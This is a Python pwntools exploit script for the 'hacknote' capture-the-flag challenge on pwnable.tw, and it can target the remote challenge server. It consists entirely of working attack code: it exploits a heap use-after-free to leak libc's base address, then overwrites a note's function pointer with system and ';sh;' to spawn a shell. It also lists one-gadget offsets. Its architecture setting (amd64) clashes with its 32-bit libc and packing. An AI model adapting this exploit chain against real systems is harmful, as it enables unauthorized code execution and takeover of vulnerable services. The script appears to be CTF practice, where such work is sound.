from pwn import *

# Set up pwntools for the correct architecture
exe = "./hacknote"
libc = ELF("libc_32.so.6")
context.arch = "amd64"
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10102)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

arr = [0, 0, 0, 0, 0]

def add(size, cont):
    sa(b"Your choice :", b"1")
    sa(b"Note size :", str(size).encode())
    sa(b"Content :", cont)
    for i in range(5):
        if(arr[i] == 0):
            arr[i] = 1
            return i

def delete(ind):
    arr[ind] = 0
    sa(b"Your choice :", b"2")
    sa(b"Index :", str(ind).encode())

def print_note(ind):
    sa(b"Your choice :", b"3")
    sa(b"Index :", str(ind).encode())
    return rl()

r = start()

a = add(500, b"A"*8)
b = add(8, b"B"*8)
delete(a)
a = add(500, b"A"*4)

libc.address = u32(print_note(a)[-5:-1].ljust(4, b"\x00")) - 1771440
log.info(f"libc     : {hex(libc.address)}")

delete(b)
delete(a)

#one gadgets: 0x3a819 0x5f065 0x5f066
one_gagu = libc.address + 0x3a819
add(8, p32(libc.sym.system) + b";sh;")
# add(8, p32(one_gagu) + p32(0))

sa(b"Your choice :", b"3")
sa(b"Index :", b"1")


r.interactive()
